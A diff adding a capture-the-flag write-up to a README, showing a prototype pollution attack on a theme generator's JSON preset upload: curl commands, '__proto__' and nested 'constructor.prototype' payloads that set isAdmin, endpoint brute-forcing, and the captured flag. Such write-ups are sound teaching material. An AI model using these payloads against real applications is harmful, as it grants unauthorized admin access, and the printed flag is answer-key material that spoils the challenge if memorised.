@@ -59,7 +59,7 @@
 
 - [random-gallery](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#random-gallery)
 
-- theme-generator
+- [theme-generator](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#theme-generator)
 
 ### Pwn
 
@@ -80,6 +80,108 @@
 - [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)
 
 ## --------------------------------------------------
+
+### theme-generator
+
+- I opened the challenge and saw a theme generator with an /admin/flag link that said “admins only.” Looked harmless, so I tried the easiest thing first: log in and keep the cookie.
+
+- Step 1 — quick login
+
+```
+HOST="http://ctf.ac.upt.ro:9358"
+
+curl -s -c c.txt -X POST -d 'username=guest&password=guest' "$HOST/login" > /dev/null
+curl -b c.txt "$HOST/admin/flag"
+```
+
+- Okay, nothing. The UI had “Upload New Preset,” which usually means the server will merge some JSON.
+
+- Step 2
+
+```
+I made the classic payload and sent it. It didn’t work — looked like they blocked magic keys at the top level.
+
+cat > pp.json <<'EOF'
+{ "__proto__": { "isAdmin": true } }
+EOF
+
+curl -s -b c.txt -F 'preset=@pp.json;type=application/json'   "$HOST/api/preset/upload" > /dev/null
+
+curl -b c.txt "$HOST/admin/flag"
+```
+
+- I also tried a query-string trick in case they used qs, but it didn’t flip anything because nothing merged it globally.
+
+```
+curl -s -b c.txt "$HOST/?constructor.prototype.isAdmin=true" > /dev/null
+curl -b c.txt "$HOST/admin/flag"
+```
+
+- Step 3
+
+- Maybe the file field wasn’t “preset.” I brute-guessed a few common ones. Still no flag.
+
+```
+for fld in preset file theme config upload; do
+  curl -s -b c.txt -F "$fld=@pp.json;type=application/json"     "$HOST/api/preset/upload" > /dev/null
+done
+```
+
+- Step 4 — the tweak that worked (nested path)
+
+- I figured the blocker only checked the first level. Deep merges like to walk into constructor.prototype, so I hid my write there. New payload:
+
+```
+cat > pp2.json <<'EOF'
+{
+  "theme": {
+    "constructor": {
+      "prototype": { "isAdmin": true }
+    }
+  }
+}
+EOF
+```
+
+- Then I retried the upload (same endpoint, “preset” field).
+
+```
+curl -s -b c.txt -F 'preset=@pp2.json;type=application/json'   "$HOST/api/preset/upload" > /dev/null
+```
+
+- On the first port it still said “admins only,” so I moved to the fresh instance they gave us and replayed the steps.
+
+- Step 5 — new instance, same idea, flag
+
+```
+HOST="http://ctf.ac.upt.ro:9133"
+
+curl -s -c c.txt -X POST -d 'username=guest&password=guest' "$HOST/login" > /dev/null
+
+cat > pp.json <<'EOF'
+{
+  "theme": {
+    "constructor": {
+      "prototype": { "isAdmin": true }
+    }
+  }
+}
+EOF
+
+# try a few likely endpoints/fields, then pull the flag
+endpoints=(/api/preset/upload /api/upload /upload /api/theme/upload /api/import)
+fields=(preset file theme config upload data)
+for ep in "${endpoints[@]}"; do
+  for fld in "${fields[@]}"; do
+    curl -s -b c.txt -F "$fld=@pp.json;type=application/json" "$HOST$ep" > /dev/null
+  done
+done
+
+curl -s -b c.txt "$HOST/admin/flag"
+```
+- ctf{fa82311c2970593b2df929b7d0f1ca6292a9a2d3707057b84a5127ceed38edd6}
+
+- What actually happened: My first payload was blocked at the top level. The nested one let the server’s deep merge walk theme → constructor → prototype and set isAdmin on Object.prototype. After that, req.user.isAdmin looked true everywhere, so /admin/flag gave me the flag.
 
 ### octojail
 
